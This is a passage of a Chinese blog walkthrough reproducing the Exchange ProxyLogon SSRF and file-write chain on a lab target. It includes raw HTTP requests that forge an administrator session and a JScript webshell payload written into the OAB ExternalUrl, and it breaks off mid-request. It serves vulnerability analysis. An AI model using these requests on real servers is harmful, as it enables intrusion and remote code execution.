<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /ecp/DDI/DDIService.svc/SetObject?ActivityCorrelationID=<span class="hljs-number">30</span>a<span class="hljs-number">0575</span>a-<span class="hljs-number">5</span>ee<span class="hljs-number">8</span>-<span class="hljs-number">8</span>b<span class="hljs-number">03</span>-<span class="hljs-number">181</span>a-ea<span class="hljs-number">1</span>cdc<span class="hljs-number">1</span>fb<span class="hljs-number">7</span>b<span class="hljs-number">4</span>&amp;schema=OABVirtualDirectory&amp;msExchEcpCanary=AQB_nzZ<span class="hljs-number">3</span>TkaV<span class="hljs-number">7</span>UmDQbbI<span class="hljs-number">4</span>GBeZYlBt<span class="hljs-number">9</span>oIdPNrql<span class="hljs-number">9</span>tKVyzP<span class="hljs-number">6</span>vDQRsOmEkxlP<span class="hljs-number">1</span>NDQK<span class="hljs-number">1</span>d<span class="hljs-number">5</span>dAhz<span class="hljs-number">17</span>bCI.<br></code></pre></div></td></tr></table></figure>





<p><img src="https://img-blog.csdnimg.cn/img_convert/ed07b288c73d1cbab8ac9c54559bc7f1.png" srcset="/img/loading.gif" lazyload></p>
<p>在重置位置，填入文件保存目录，然后重置。</p>
<figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript"><span class="hljs-symbol">\\</span>127.0.0.1<span class="hljs-symbol">\c</span>$<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\E</span>xchange Server<span class="hljs-symbol">\V</span>15<span class="hljs-symbol">\F</span>rontEnd<span class="hljs-symbol">\H</span>ttpProxy<span class="hljs-symbol">\o</span>wa<span class="hljs-symbol">\a</span>uth<span class="hljs-symbol">\k</span>kfine.aspx<br></code></pre></div></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/img_convert/519e37b257852e87e40139d458144266.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/72668085b268e0323bbb453b49717a95.png" srcset="/img/loading.gif" lazyload></p>
<p>查看请求包。请求中有一个关键参数<code>msExchEcpCanary</code>，如果没有这个参数，服务端返回500错误。这个参数的值可以利用CVE-2021-26855 SSRF漏洞通过多次请求获取。</p>
<p>可以看到第一个请求包是设置文件保存路径的请求包，使用的也是<code>/ecp/DDI/DDIService.svc/SetObject</code>接口，并且<code>msExchEcpCanary</code>和<code>ActivityCorrelationID</code>参数也是一样的。仔细观察其实就是请求包里面的字段<code>ExternalUrl</code>变为了<code>FilePathName</code></p>
<figure class="highlight maxima"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs maxima">/ecp/DDI/DDIService.svc/SetObject?ActivityCorrelationID=30a0575a-5ee8-<span class="hljs-number">8b03</span>-181a-ea1cdc1fb7b4&amp;schema=OABVirtualDirectory&amp;msExchEcpCanary=AQB_nzZ3TkaV7UmDQbbI4GBeZYlBt9oIdPNrql9tKVyzP6vDQRsOmEkxlP1NDQK1d5dAhz17bCI.<br></code></pre></div></td></tr></table></figure>



<p><img src="https://img-blog.csdnimg.cn/img_convert/9f28f94142359611f8eff2d7ed295001.png" srcset="/img/loading.gif" lazyload></p>
<p>第二个是点击重置的请求包，使用的是<code>/ecp/DDI/DDIService.svc/GetList</code>接口</p>
<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">/ecp/</span>DDI<span class="hljs-regexp">/DDIService.svc/</span>GetList?ActivityCorrelationID=<span class="hljs-number">085910</span>a4-<span class="hljs-number">27</span>c2-<span class="hljs-number">5616</span>-c475-<span class="hljs-number">1164</span>aa5d54d6&amp;schema=VirtualDirectory&amp;msExchEcpCanary=AQB_nzZ3TkaV7UmDQbbI4GBeZYlBt9oIdPNrql9tKVyzP6vDQRsOmEkxlP1NDQK1d5dAhz17bCI.<br></code></pre></div></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/img_convert/946c8353f9d1ed47d2d23dcfc04edf48.png" srcset="/img/loading.gif" lazyload></p>
<p>然后可以看到，靶机上已经能够看到上传的木马文件。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/c47b25f84cff1e879e5a920842b2d4b1.png" srcset="/img/loading.gif" lazyload></p>
<p>重置完成，访问木马文件</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/e56a38ed609e5245c2974e1f990771cf.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><img src="https://img-blog.csdnimg.cn/img_convert/10edf421e4277482d742f5996bea50a3.png" srcset="/img/loading.gif" lazyload></p>
<p>所以我们的攻击思路就是首先需要通过ssrf获取到域用户的cookie，然后通过文件上传来写马。</p>
<h3 id="获取server-name"><a href="#获取server-name" class="headerlink" title="获取server name"></a>获取server name</h3><figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/ecp/target.js</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>X-BEResource=localhost/owa/auth/logon.aspx?~1941962753<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/xml<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>0<br><br></code></pre></div></td></tr></table></figure>



<p>利用500回显查看到<code>X-Feserver: WIN-V2JNEUVOLJV</code>中<code>server name</code>即为<code>WIN-V2JNEUVOLJV</code></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/600b59d82e754499077777d453a3389a.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="获取域用户cookie"><a href="#获取域用户cookie" class="headerlink" title="获取域用户cookie"></a>获取域用户cookie</h3><p>这里ssrf去访问<code>autodiscover.xml</code>自动配置文件的原因是因为Autodiscover(自动发现)是自Exchange Server 2007开始推出的一项自动服务，用于自动配置用户在Outlook中邮箱的相关设置，简化用户登陆使用邮箱的流程。如果用户账户是域账户且当前位于域环境中，通过自动发现功能用户无需输入任何凭证信息即可登陆邮箱。<code>autodiscover.xml</code>文件中包含有LegacyDN 的值</p>
<p>通过SSRF漏洞读取autodiscover.xml文件，获取LegacyDN的值；</p>
<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ecp/target.js</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>X-BEResource=name]@win-v2jneuvoljv.test.com:443/autodiscover/autodiscover.xml?#~1941962753<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/xml<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>337<br><br>&lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006&quot;&gt;<br>    &lt;Request&gt;<br>	&lt;EMailAddress&gt;Administrator@test.com&lt;/EMailAddress&gt;<br>	&lt;AcceptableResponseSchema&gt;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&lt;/AcceptableResponseSchema&gt;<br>    &lt;/Request&gt;<br>&lt;/Autodiscover&gt;<br></code></pre></div></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/img_convert/7b3877297f86d6a5d4cd252fa9f26a67.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="利用Legacy-DN获取SID；"><a href="#利用Legacy-DN获取SID；" class="headerlink" title="利用Legacy DN获取SID；"></a>利用Legacy DN获取SID；</h3><p>消息处理API（MAPI）是Outlook用于接收和发送电子邮件相关信息的API，在Exchange 2016以及2019当中，微软又为其加入了MAPI over HTTP机制，使得Exchange和Outlook可以在标准的HTTP协议模型之下利用MAPI进行通信。整个MAPI over HTTP的协议标准可以在<a target="_blank" rel="noopener" href="https://interoperability.blob.core.windows.net/files/MS-OXCMAPIHTTP/[MS-OXCMAPIHTTP].pdf">官方文档</a>中查询。为了获取对应邮箱的SID，如下图所示的exploit中利用了用于发起一个新会话的Connect类型请求。</p>
<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ecp/1.js</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>X-BEResource=a@win-v2jneuvoljv.test.com:444/mapi/emsmdb?~1941962754<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/mapi-http<br><span class="hljs-attribute">X-Requesttype</span><span class="hljs-punctuation">: </span>Connect<br><span class="hljs-attribute">X-Clientinfo</span><span class="hljs-punctuation">: </span>x<br><span class="hljs-attribute">X-Clientapplication</span><span class="hljs-punctuation">: </span>Outlook/15.0.4815.1002<br><span class="hljs-attribute">X-Requestid</span><span class="hljs-punctuation">: </span>x<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>151<br><br>/o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=cb4034a0f211454d89075d7b5f20cbfa-Admin+ \x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00<br></code></pre></div></td></tr></table></figure>


<p><img src="https://img-blog.csdnimg.cn/img_convert/41f2e2dea32791a75ee0deaec2316aee.png" srcset="/img/loading.gif" lazyload></p>
<p> POST 请求格式为</p>
<figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">legacyDn + &quot;<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>e4<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>09<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>09<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00&quot;<br></code></pre></div></td></tr></table></figure>



<p>一个正常的Connect类型请求如图所示，包含UserDn等多个字段，其中UserDn指的是用户在该域中的专有名称（Distinguish Name），该字段已被我们通过上一步骤的请求中得到。该Connect类型请求通过解析后会将相关参数交给Exchange RPC服务器中的EcDoConnectEx方法执行。由于发起请求的RPC客户端的权限为SYSTEM，对应的SID为S-1-5-18，与请求中给出的DN所对应的SID不匹配，于是响应中返回错误信息，该信息中包含了DN所对应的SID，从而达到了目的。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/aeccbfa76c4c8a0b78b57fcf3f65f57a.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="使用sid获取cookie"><a href="#使用sid获取cookie" class="headerlink" title="使用sid获取cookie"></a>使用sid获取cookie</h3><p>请求包</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /ecp/<span class="hljs-number">1</span>.js HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: localhost<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">88</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4324</span>.<span class="hljs-number">190</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>: */*<br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Cookie</span>: X-BEResource=Administrator@win-v<span class="hljs-number">2</span>jneuvoljv.test.com:<span class="hljs-number">444</span>/ecp/proxyLogon.ecp?#~<span class="hljs-number">1941962753</span><br><span class="hljs-attribute">Content</span>-Type: text/xml<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">256</span><br><span class="hljs-attribute">msExchLogonMailbox</span>: S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">18</span><br><br><span class="hljs-section">&lt;r at=<span class="hljs-string">&quot;Negotiate&quot;</span> ln=<span class="hljs-string">&quot;Administrator&quot;</span>&gt;</span><span class="hljs-section">&lt;s&gt;</span><span class="hljs-attribute">S</span>-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">254742065</span>-<span class="hljs-number">2746332885</span>-<span class="hljs-number">3299130760</span>-<span class="hljs-number">500</span>&lt;/s&gt;&lt;s a=<span class="hljs-string">&quot;7&quot;</span> <br>    <span class="hljs-attribute">t</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;S-<span class="hljs-number">1</span>-<span class="hljs-number">1</span>-<span class="hljs-number">0</span>&lt;/s&gt;&lt;s a=<span class="hljs-string">&quot;7&quot;</span> t=<span class="hljs-string">&quot;1&quot;</span>&gt;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">2</span>&lt;/s&gt;&lt;s a=<span class="hljs-string">&quot;7&quot;</span> t=<span class="hljs-string">&quot;1&quot;</span>&gt;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">11</span>&lt;/s&gt;&lt;s a=<span class="hljs-string">&quot;7&quot;</span> t=<span class="hljs-string">&quot;1&quot;</span>&gt;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">15</span>&lt;/s&gt;&lt;s <br>    <span class="hljs-attribute">a</span>=<span class="hljs-string">&quot;3221225479&quot;</span> t=<span class="hljs-string">&quot;1&quot;</span>&gt;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">5</span>-<span class="hljs-number">0</span>-<span class="hljs-number">6948923</span>&lt;/s&gt;&lt;/r&gt; <br></code></pre></div></td></tr></table></figure>


<p><img src="https://img-blog.csdnimg.cn/img_convert/409461fa6d0e0280233fc22295d28576.png" srcset="/img/loading.gif" lazyload></p>
<p>在该物理路径下的.NET应用配置文件<code>web.config</code>中定义了不同路径的HTTP请求对应的处理函数，检索可知路径<code>proxyLogon.ecp</code>是由<code>ProxyLogonHandler</code>来处理的，然而对相应的dll进行反编译后发现该<code>Handler</code>仅修改了HTTP响应的状态码。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/b4e7743994335ce03839270e70b4ec7c.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>最终通过调试后发现，真正与<code>msExchEcpCanary</code>以及<code>ASP.NET_SessionId</code>相关的代码是在类<code>RbacModule</code>中的，通过<code>web.config</code>可以看到<code>RbacModule</code>作为应用的其中一个模块用于处理HTTP请求。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/a4ee4c2d8407c02eb73db35e10d9d1a5.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>在该模块中由函数<code>Application_PostAuthenticateRequest</code>具体实现对HTTP请求的解析。相关关键代码如下，首先函数根据<code>httpContext</code>生成<code>AuthenticationSettings</code>实例。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/18b53ab169b45b1c7481b325c4c10202.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>在<code>AuthenticationSettings</code>的构造函数中，由于所有的if语句均不满足，函数会根据<code>context</code>生成一个<code>RbacSettings</code>实例，并赋值给自己的<code>Session</code>属性。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/cae2d3df515b4b1fc3df00533ebf8c45.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>而在<code>RbacSettings</code>的构造函数中，函数会判断请求路径是否以<code>/proxyLogon.ecp</code>结尾，若是则进入下方的if分支，利用请求数据创建<code>SerializedAccessToken</code>实例。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/701f027edcb2adb4afacf485f36824f0.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>分析<code>SerializedAccessToken</code>类，可知该类会将访问令牌序列化成XML格式，其中根节点的名字为<code>r</code>，根节点的<code>at</code>属性对应访问令牌中的认证类型、<code>ln</code>属性对应访问令牌中的登录名称；根节点的子节点为SID节点，节点名字为<code>s</code>，当中的属性<code>t</code>对应SID类型，属性<code>a</code>对应SID属性，节点中的文本为SID。其序列化函数定义如下，可以看到令牌大致与Windows中的安全访问令牌内容相似。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/070327fbbde011327b66e4b9d8e0bf98.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>随后构造函数根据请求头部的<code>msExchLogonMailbox</code>字段以及<code>logonUserIdentity</code>变量调用<code>GetInboundProxyCaller</code>函数获取该代理请求的发起服务器。若返回结果不为空则调用<code>EcpLogonInformation.Create</code>函数创建一个<code>EcpLogonInformation</code>实例，再用该实例创建一个<code>EcpIdentity</code>实例。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/146ca5a45781bf5a56a8b92f896fce97.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><code>Create</code>函数首先根据<code>logonMailboxSddlSid</code>生成安全标识符实例，然后根据<code>proxySecurityAccessToken</code>参数生成<code>SerialzedIdentity</code>实例，并最后生成<code>EcpLogonInformation</code>实例。而根据名称可知<code>logonUserIdentity</code>定义了登入用户的权限，因而我们能够得到任意SID对应用户的权限。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/63aaab0e96f47e96b61a08519312e417.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>之后程序回到<code>RbacSettings</code>的构造函数中，在响应中添加<code>ASP.NET_SessionId</code>Cookie。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/3241513b59269cc0322652e1dfc48a78.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>程序接下来返回到<code>RbacModule</code>的函数中，在<code>AuthenticationSettings</code>实例生成后其<code>Session</code>属性被赋值给<code>httpContext.User</code>，并进入if分支调用<code>CheckCanary</code>函数。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/313d578ee702751e735badaee12b77dd.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><code>CheckCanary</code>函数又将调用如下所示的<code>SendCanary</code>函数，该函数首先从请求的Cookie中读取Canary并尝试恢复，若成功则函数直接返回，否则生成一个新的Canary并将其加入到响应的Cookie中。从而我们能够构造满足要求的请求通过SSRF访问<code>ecp/proxyLogon.ecp</code>获得管理员的凭证。</p>
<p><img src="https://img-blog.csdnimg.cn/e42c61e58bfb4efc8c9157508c14965e.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ecp/iey8.js</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.0.16<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 <br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>X-BEResource=@win-v2jneuvoljv.test.com:444/ecp/DDI/DDIService.svc/GetObject?schema=VirtualDirectory&amp;msExchEcpCanary=AQB_nzZ3TkaV7UmDQbbI4GBeZYlBt9oIdPNrql9tKVyzP6vDQRsOmEkxlP1NDQK1d5dAhz17bCI.#~1; ASP.NET_SessionId=2c6b26f5-6662-4e85-a8cb-44e7851baea2; msExchEcpCanary=AQB_nzZ3TkaV7UmDQbbI4GBeZYlBt9o<br><br>\<br><br><br><br><br>IdPNrql9tKVyzP6vDQRsOmEkxlP1NDQK1d5dAhz17bCI.<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json; <br><span class="hljs-attribute">msExchLogonMailbox</span><span class="hljs-punctuation">: </span>S-1-5-20<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>162<br><br>&#123;&quot;filter&quot;: &#123;&quot;Parameters&quot;: &#123;&quot;__type&quot;: &quot;JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel&quot;, &quot;SelectedView&quot;: &quot;&quot;, &quot;SelectedVDirType&quot;: &quot;OAB&quot;&#125;&#125;&#125;<br><br></code></pre></div></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/img_convert/c1186bb971e522bb5ea8a0d41a003745.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/91415f64d883196a09eed02f3ea663ee.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ecp/iey8.js</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.0.16<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 <br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>X-BEResource=@win-v2jneuvoljv.test.com:444/ecp/DDI/DDIService.svc/GetObject?schema=VirtualDirectory&amp;msExchEcpCanary=AQB_nzZ3TkaV7UmDQbbI4GBeZYlBt9oIdPNrql9tKVyzP6vDQRsOmEkxlP1NDQK1d5dAhz17bCI.#~1; ASP.NET_SessionId=2c6b26f5-6662-4e85-a8cb-44e7851baea2; msExchEcpCanary=AQB_nzZ3TkaV7UmDQbbI4GBeZYlBt9oIdPNrql9tKVyzP6vDQRsOmEkxlP1NDQK1d5dAhz17bCI.<br><span class="hljs-attribute">msExchLogonMailbox</span><span class="hljs-punctuation">: </span>S-1-5-20<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json; charset=utf-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>399<br><br>&#123;&quot;identity&quot;:&#123;&quot;__type&quot;:&quot;Identity:ECP&quot;,&quot;DisplayName&quot;:&quot;OAB (Default Web Site)&quot;,&quot;RawIdentity&quot;:&quot;8bb65fea-5a07-4d88-ac1b-bc9de2740cd9&quot;&#125;,&quot;properties&quot;:&#123;&quot;Parameters&quot;:&#123;&quot;__type&quot;:&quot;JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel&quot;,&quot;ExternalUrl&quot;:&quot;http://ffff/#&lt;script language=\&quot;JScript\&quot; runat=\&quot;server\&quot;&gt; function Page_Load()&#123;/**/eval(Request[\&quot;code\&quot;],\&quot;unsafe\&quot;);&#125;&lt;/script&gt;&quot;&#125;&#125;&#125;<br></code></pre></div></td></tr></table></figure>



<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ecp/iey8.js</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.0.16<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 <br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>X-BEResource=@win-v2jneuvoljv.test.com:444/ecp/DDI/DDIService.svc/GetObject?schema=VirtualDirectory&amp;msExchEcpCanary=AQB_nzZ3TkaV7UmDQbbI4GBeZYlBt9oIdPNrql9tKVyzP6vDQRsOmEkxlP1NDQK1d5dAhz17bCI.#~1; ASP.NET_SessionId=2c6b26f5-6662-4e85-a8cb-44e7851baea2; msExchEcpCanary=AQB_nzZ3TkaV7UmDQbbI4GBeZYlBt9oIdPNrql9tKVyzP6vDQRsOmEkxlP1NDQK1d5dAhz17bCI.<br><span class="hljs-attribute">msExchLogonMailbox</span><span class="hljs-punctuation">: </span>S-1-5-20<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json; charset=utf-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>399<br><br>&#123;&quot;identity&quot;: &#123;&quot;__type&quot;: &quot;Identity:ECP&quot;, &quot;DisplayName&quot;: &quot;OAB (Default Web Site)&quot;, 